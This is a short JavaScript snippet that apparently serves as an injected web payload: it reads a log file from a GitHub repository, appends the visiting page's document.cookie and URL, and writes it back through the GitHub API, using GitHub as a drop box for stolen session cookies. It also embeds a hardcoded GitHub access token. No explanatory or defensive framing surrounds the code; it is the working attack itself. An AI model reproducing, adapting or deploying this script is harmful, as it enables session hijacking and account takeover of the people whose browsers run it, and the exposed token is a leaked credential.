fetch("https://api.github.com/repos/i3g7UU/A/contents/log.txt", {
  method: "GET",
  headers: {
    "Authorization": "token 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",
    "Accept": "application/vnd.github.v3+json"
  }
})
.then(response => response.json())
.then(data => {
  let oldContent = atob(data.content || ""); // Decode existing log
  let newContent = oldContent + "\n" + document.cookie + " | " + document.location;
 
  return fetch("https://api.github.com/repos/i3g7UU/A/contents/log.txt", {
    method: "PUT",
    headers: {
      "Authorization": "token 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",
      "Accept": "application/vnd.github.v3+json"
    },
    body: JSON.stringify({
      message: "Update log",
      content: btoa(newContent), // Encode new log
      sha: data.sha // Required to update file
    })
  });
});
